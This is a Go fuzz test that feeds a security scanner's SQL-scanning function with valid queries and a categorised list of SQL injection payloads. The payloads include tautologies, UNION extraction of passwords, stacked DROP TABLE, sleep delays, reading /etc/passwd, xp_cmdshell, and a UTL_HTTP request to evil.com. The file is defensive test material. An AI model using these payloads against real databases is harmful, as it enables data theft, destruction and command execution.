package security

import (
	"testing"
)

// FuzzScanSQL fuzzes the security scanner's ScanSQL method with arbitrary SQL input.
// The scanner must never panic — only return results gracefully.
func FuzzScanSQL(f *testing.F) {
	// Valid SQL seeds
	validSQL := []string{
		"SELECT 1",
		"SELECT * FROM users WHERE id = 1",
		"INSERT INTO users (name, email) VALUES ('Alice', 'a@b.com')",
		"UPDATE users SET name = 'Bob' WHERE id = 1",
		"DELETE FROM users WHERE id = 1",
		"CREATE TABLE t (id INT PRIMARY KEY)",
		"SELECT a FROM t1 JOIN t2 ON t1.id = t2.id",
		"WITH cte AS (SELECT 1) SELECT * FROM cte",
		"SELECT COUNT(*) FROM t GROUP BY a HAVING COUNT(*) > 1",
		"SELECT CAST(price AS INTEGER) FROM products",
	}

	// SQL injection pattern seeds
	injectionSQL := []string{
		// Tautology
		"SELECT * FROM users WHERE 1=1",
		"SELECT * FROM users WHERE 'a'='a'",
		"SELECT * FROM users WHERE id=1 OR 1=1",
		// Comment bypass
		"SELECT * FROM users WHERE id=1--",
		"SELECT * FROM users WHERE id=1/**/",
		"SELECT * FROM users WHERE id=1#",
		"admin'--",
		// Union-based
		"SELECT * FROM users UNION SELECT username, password FROM admin",
		"' UNION SELECT 1,2,3--",
		"1 UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--",
		// Stacked queries
		"SELECT 1; DROP TABLE users",
		"SELECT 1; DELETE FROM users",
		"'; DROP TABLE users--",
		// Time-based
		"SELECT SLEEP(5)",
		"SELECT * FROM users WHERE id=1 AND SLEEP(5)",
		"SELECT pg_sleep(5)",
		"'; WAITFOR DELAY '0:0:5'--",
		// Out-of-band
		"SELECT LOAD_FILE('/etc/passwd')",
		"EXEC xp_cmdshell('dir')",
		"SELECT UTL_HTTP.REQUEST('http://evil.com')",
		// Dangerous functions
		"EXEC sp_executesql N'SELECT 1'",
		"PREPARE stmt FROM 'SELECT 1'",
		// Boolean-based
		"SELECT * FROM users WHERE id=1 AND 1=1",
		"SELECT * FROM users WHERE id=1 AND 1=2",
		"SELECT * FROM users WHERE id=1 AND SUBSTRING(username,1,1)='a'",
		// Edge cases
		"",
		";;;",
		"SELECT",
		"' OR ''='",
		"1' AND '1'='1",
		"admin' OR '1'='1' /*",
		string(make([]byte, 10000)), // large input
	}

	for _, s := range validSQL {
		f.Add(s)
	}
	for _, s := range injectionSQL {
		f.Add(s)
	}

	f.Fuzz(func(t *testing.T, sql string) {
		scanner := NewScanner()
		_ = scanner.ScanSQL(sql)
	})
}
